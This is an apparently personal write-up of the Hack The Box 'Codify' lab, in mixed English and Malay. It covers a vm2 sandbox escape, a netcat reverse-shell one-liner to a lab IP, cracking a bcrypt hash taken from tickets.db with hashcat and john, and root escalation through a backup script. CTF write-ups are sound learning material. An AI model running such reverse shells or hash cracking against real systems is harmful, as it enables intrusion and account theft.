---
date:
  created: 2023-12-19
  updated: 2023-12-19
description: HTB-Codify(easy) Writeup
tags:
  - enum4linux
  - cve
  - john
  - hashcat
  - linpeas
  - pspy64
comments: true
---

# Codify

## Recon
nmap scan
if have smb or any kind of port service. use enum4linux

## Enumeration
see what is happen on the web. make some reading. find vm2 exploit
https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.9 1234 >/tmp/f`

## Exploitation
cari something interesting
found seomthing on /var/www/contact/tickets.db
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
search dulu what type is this hash
`hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt -w 3`
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

got user.txt

## Privesc
direct sudo -l
baca script /opt/scripts/mysql-backup.sh
tanya chatgpt.. try to understand and listen how it works
guna pspy64 `wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64`

then transfer pass.py atau password.py
run
got root.txt